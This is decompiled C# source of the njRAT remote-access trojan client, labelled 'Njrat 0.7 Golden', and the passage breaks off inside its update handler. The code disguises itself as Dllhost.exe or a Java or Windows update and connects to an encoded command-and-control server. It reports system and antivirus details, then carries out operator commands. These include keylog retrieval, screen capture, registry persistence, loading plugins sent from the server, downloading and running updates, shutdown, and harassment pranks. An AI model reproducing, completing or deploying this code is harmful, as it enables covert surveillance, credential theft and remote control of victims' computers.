using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Stub.My;

namespace Stub.OK.j;

internal sealed class OK
{
	public const int SWP_HIDEWINDOW = 128;

	public const int SWP_SHOWWINDOW = 64;

	private static byte[] b = new byte[5121];

	public static bool BD = Conversions.ToBoolean("True");

	public static TcpClient C = null;

	public static bool Cn = false;

	public static string DR = "TEMP";

	public static string EXE = "Dllhost.exe";

	public static Computer F = new Computer();

	public static FileStream FS;

	private static string H = "NC50Y3म\u0947ubmdyb2suaW8!";

	public static string icn = "#ic";

	public static bool Idr = Conversions.ToBoolean("True");

	public static bool IsF = Conversions.ToBoolean("True");

	public static bool RegistrySt = Conversions.ToBoolean("True");

	private static string lastcap = "";

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly()!.Location);

	private static MemoryStream MeM = new MemoryStream();

	public static object MT = null;

	public static string P = "粹त\u093eQ5Nj의도=";

	public static string xDlol1 = "Java update";

	public static string Sleep = "False";

	public static string Sleep1 = "1";

	public static object PLG = null;

	public static string RG = "Windows Update";

	public static string Task = "True";

	public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static string Hide = "True";

	public static string HP = "True";

	public static bool SPR = Conversions.ToBoolean("false");

	public static string VN = "amVydHZh";

	public static string VR = "Njrat 0.7 Golden By Hassan Amiri";

	public static string Y = "|Hassan|";

	private static void HassanAmiri(object a0)
	{
		Ind((byte[])a0);
	}

	private static void ImHere(object sender, SessionEndingEventArgs e)
	{
		ED();
	}

	public static string ACT()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			return ENB(ref WinTitle);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.SetProjectError(ex2);
				Exception projectError = ex2;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		FileInfo lO = LO;
		lock (lO)
		{
			try
			{
				if (C != null)
				{
					try
					{
						C.Close();
						C = null;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.SetProjectError(ex2);
						Exception projectError = ex2;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.SetProjectError(ex4);
					Exception projectError2 = ex4;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.SetProjectError(ex6);
				Exception projectError3 = ex6;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				C = new TcpClient();
				C.ReceiveBufferSize = 204800;
				C.SendBufferSize = 204800;
				C.Client.SendTimeout = 10000;
				C.Client.ReceiveTimeout = 10000;
				C.Connect(H, Conversions.ToInteger(P));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GTV("vn", "")))), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GTV("vn", "")))));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = string.Concat(text + H + ":" + P + "\r\n", DR, "\r\n", EXE, "\r\n", Conversions.ToString(Idr), "\r\n", Conversions.ToString(IsF), "\r\n", Conversions.ToString(RegistrySt), "\r\n", Conversions.ToString(BD));
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.SetProjectError(ex8);
					Exception projectError4 = ex8;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.SetProjectError(ex10);
				Exception projectError5 = ex10;
				ProjectData.SetProjectError(projectError5);
				Cn = false;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static string GetAntiVirus()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		object obj = default(object);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		object objectValue = default(object);
		object objectValue2 = default(object);
		object objectValue3 = default(object);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj2;
				object[] array;
				bool[] array2;
				object obj3;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					obj = "Select * From AntiVirusProduct";
					goto IL_0009;
				case 283:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001d;
						case 4:
							goto IL_006b;
						case 8:
							goto IL_0099;
						case 5:
							goto IL_00b5;
						case 6:
							goto end_IL_0000_2;
						case 7:
							goto IL_00de;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_007b:
					if (!enumerator.MoveNext())
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
						goto IL_0099;
					}
					objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					goto IL_00b5;
					IL_00de:
					num = 7;
					goto IL_007b;
					IL_0009:
					num = 2;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2", (string)null));
					goto IL_001d;
					IL_001d:
					num = 3;
					obj2 = objectValue2;
					array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
					array2 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet(obj2, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						obj = RuntimeHelpers.GetObjectValue(array[0]);
					}
					objectValue3 = RuntimeHelpers.GetObjectValue(obj3);
					goto IL_006b;
					IL_00b5:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
					IL_0099:
					num = 8;
					text = "No Antivirus";
					goto end_IL_0000_3;
					IL_006b:
					num = 4;
					enumerator = ((IEnumerable)objectValue3).GetEnumerator();
					goto IL_007b;
					end_IL_0000_2:
					break;
				}
				num = 6;
				text = NewLateBinding.LateGet(objectValue, (Type)null, "displayName", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
				break;
				end_IL_0000:;
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0000_dispatch = 283;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG, writable: true)!.DeleteValue(n);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void ED()
	{
		pr(0);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static object GTV(string n, object ret)
	{
		try
		{
			return RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))))))))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)));
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return objectValue;
		}
	}

	public static string HWD()
	{
		try
		{
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void SetWallpaper(object Wallpaper)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		Image val = null;
		if (Wallpaper is string)
		{
			val = Image.FromFile(Conversions.ToString(RuntimeHelpers.GetObjectValue(Wallpaper)));
		}
		else
		{
			if (!(Wallpaper is Image))
			{
				return;
			}
			val = (Image)Wallpaper;
		}
		string lpvParam = Interaction.Environ("temp") + "\\CurrentWallpaper.Bmp";
		val.Save(lpvParam, ImageFormat.get_Bmp());
		SystemParametersInfo(20, 0, ref lpvParam, 3);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Command, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ReturnString, long ReturnLength, long hWnd);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Ind(byte[] b)
	{
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab3: Expected O, but got Unknown
		//IL_0b4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b55: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				switch (text)
				{
				case "fun":
					Send("fun");
					break;
				case "site":
					Send("site");
					break;
				case "cwall":
					SetWallpaper(array[1]);
					break;
				case "Restart":
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
					break;
				case "Shutdown":
					Interaction.Shell("shutdown -s -t 00", (AppWinStyle)0, false, -1);
					break;
				case "ErorrMsg":
				{
					MessageBoxIcon val = default(MessageBoxIcon);
					switch (array[1])
					{
					case "1":
						val = (MessageBoxIcon)64;
						break;
					case "2":
						val = (MessageBoxIcon)32;
						break;
					case "3":
						val = (MessageBoxIcon)48;
						break;
					case "4":
						val = (MessageBoxIcon)16;
						break;
					}
					MessageBoxButtons val2 = default(MessageBoxButtons);
					switch (array[2])
					{
					case "1":
						val2 = (MessageBoxButtons)4;
						break;
					case "2":
						val2 = (MessageBoxButtons)3;
						break;
					case "3":
						val2 = (MessageBoxButtons)0;
						break;
					case "4":
						val2 = (MessageBoxButtons)1;
						break;
					case "5":
						val2 = (MessageBoxButtons)5;
						break;
					case "6":
						val2 = (MessageBoxButtons)2;
						break;
					}
					MessageBox.Show(array[4], array[3], val2, val);
					break;
				}
				case "NormalMouse":
					SwapMouseButton(0L);
					break;
				case "ReverseMouse":
					SwapMouseButton(256L);
					break;
				case "peech":
				{
					object[] array2 = new object[1];
					string[] array3 = array;
					int num = 1;
					array2[0] = array3[1];
					object[] array4 = array2;
					bool[] array5 = new bool[1] { true };
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", "")))), (Type)null, "speak", array4, (string[])null, (Type[])null, array5, true);
					if (array5[0])
					{
						array3[num] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array4[0]))), typeof(string)));
					}
					break;
				}
				case "HideM":
				{
					string ReturnString = "Shell_traywnd";
					string s = "";
					int hwnd2 = FindWindowA(ref ReturnString, ref s);
					SetWindowPos(hwnd2, 0, 0, 0, 0, 0, 128);
					break;
				}
				case "ShowM":
				{
					string s = "Shell_traywnd";
					string ReturnString = "";
					int hwnd = FindWindowA(ref s, ref ReturnString);
					SetWindowPos(hwnd, 0, 0, 0, 0, 0, 64);
					break;
				}
				case "opencd":
				{
					string s = "set cdaudio door open";
					string ReturnString = Conversions.ToString(0);
					mciSendStringA(ref s, ref ReturnString, 0L, 0L);
					break;
				}
				case "closecd":
				{
					string s = "set cdaudio door closed";
					string ReturnString = Conversions.ToString(0);
					mciSendStringA(ref s, ref ReturnString, 0L, 0L);
					break;
				}
				case "OpenPage":
					Process.Start(array[1]);
					break;
				case "MonitorON":
					SendMessage(-1, 274u, 61808u, -1);
					break;
				case "MonitorOFF":
					SendMessage(-1, 274u, 61808u, 2);
					break;
				case "Scary1":
					Process.Start("www.upload.ee/image/2298158/koli.swf");
					break;
				case "Scary2":
					Process.Start("www.upload.ee/image/2971847/scare4.swf");
					break;
				case "Scary3":
					Process.Start("www.upload.ee/image/2299952/facey.swf");
					break;
				case "ll":
					Cn = false;
					return;
				case "kl":
				{
					string y = Y;
					string s = A.GetL();
					Send("kl" + y + ENB(ref s));
					return;
				}
				case "prof":
					switch (array[1])
					{
					case "~":
						STV(array[2], array[3], RegistryValueKind.String);
						break;
					case "!":
						STV(array[2], array[3], RegistryValueKind.String);
						Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + Y + array[1] + Y), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GTV(array[1], ""))))))))));
						break;
					case "@":
						DLV(array[2]);
						break;
					}
					return;
				}
				string text3 = default(string);
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "inv":
					{
						byte[] array6 = (byte[])GTV(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array6.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream3 = new MemoryStream();
							int length = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
							memoryStream3.Write(b, length, b.Length - length);
							array6 = ZIP(memoryStream3.ToArray());
							STV(array[1], array6, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array6, "A"))))))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!Cn), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)))), (object)true, false))))))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					case "ret":
					{
						byte[] array7 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array7.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length2 = (array[0] + Y + array[1] + Y).Length;
							memoryStream4.Write(b, length2, b.Length - length2);
							array7 = ZIP(memoryStream4.ToArray());
							STV(array[1], array7, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array7, "A"))))))));
						string[] array8 = new string[5]
						{
							"ret",
							Y,
							array[1],
							Y,
							null
						};
						string[] array9 = array8;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue2))), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)))));
						array9[4] = ENB(ref s);
						Send(string.Concat(array8));
						return;
					}
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val3 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						Size size = new Size(((Image)val3).get_Width(), ((Image)val3).get_Height());
						val4.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							bounds = new Rectangle(size: new Size(32, 32), location: Cursor.get_Position());
							Cursors.get_Default().Draw(val4, bounds);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.SetProjectError(ex2);
							Exception projectError = ex2;
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						val4.Dispose();
						Bitmap val5 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val4 = Graphics.FromImage((Image)(object)val5);
						val4.DrawImage((Image)(object)val3, 0, 0, ((Image)val5).get_Width(), ((Image)val5).get_Height());
						val4.Dispose();
						MemoryStream memoryStream = new MemoryStream();
						string s = "CAP" + Y;
						b = SB(ref s);
						memoryStream.Write(b, 0, b.Length);
						MemoryStream memoryStream2 = new MemoryStream();
						((Image)val5).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
						string text2 = md5(memoryStream2.ToArray());
						if (Operators.CompareString(text2, lastcap, false) != 0)
						{
							lastcap = text2;
							memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
						}
						else
						{
							memoryStream.WriteByte(0);
						}
						Sendb(memoryStream.ToArray());
						memoryStream.Dispose();
						memoryStream2.Dispose();
						((Image)val3).Dispose();
						((Image)val5).Dispose();
						return;
					}
					case "un":
						switch (array[1])
						{
						case "~":
							UNS();
							break;
						case "!":
							pr(0);
							ProjectData.EndApp();
							break;
						case "@":
							pr(0);
							Process.Start(LO.FullName);
							ProjectData.EndApp();
							break;
						}
						return;
					}
					switch (text)
					{
					case "Ex":
					{
						if (PLG == null)
						{
							Send("PLG");
							int num2 = 0;
							while (!(unchecked(PLG != null || num2 == 20) | !Cn))
							{
								num2++;
								Thread.Sleep(1000);
							}
							if ((PLG == null) | !Cn)
							{
								break;
							}
						}
						object[] array11 = new object[1] { b };
						bool[] array12 = new bool[1] { true };
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(PLG))), (Type)null, "ind", array11, (string[])null, (Type[])null, array12, true);
						if (array12[0])
						{
							b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array11[0]))))))), typeof(byte[]));
						}
						break;
					}
					case "PLG":
					{
						MemoryStream memoryStream6 = new MemoryStream();
						int length4 = (array[0] + Y).Length;
						memoryStream6.Write(b, length4, b.Length - length4);
						PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream6.ToArray()), "A"))))))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(PLG))), (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(PLG))), (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(PLG))), (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
						break;
					}
					case "up":
					{
						byte[] array10 = null;
						if (array[1][0] == '\u001f')
						{
							try
							{
								MemoryStream memoryStream5 = new MemoryStream();
								int length3 = (array[0] + Y).Length;
								memoryStream5.Write(b, length3, b.Length - length3);
								array10 = ZIP(memoryStream5.ToArray());
							}
							catch (Exception ex3)
							{
								ProjectData.SetProjectError(ex3);
								Exception ex4 = ex3;
								ProjectData.SetProjectError(ex4);
								Exception projectError2 = ex4;
								ProjectData.SetProjectError(projectError2);
								Send("MSG" + Y + "Update ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								break;
							}
						}
						else
						{
							WebClient webClient = new WebClient();
							try
							{
								array10 = webClient.DownloadData(array[1]);
							}
							catch (Exception ex5)
							{
								ProjectData.SetProjectError(ex5);
								Exception ex6 = ex5;
								ProjectData.SetProjectError(ex6);
								Exception projectError3 = ex6;
								ProjectData.SetProjectError(projectError3);
								Send("MSG" + Y + "Update ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
								break;
							}
						}
						Send("bla");
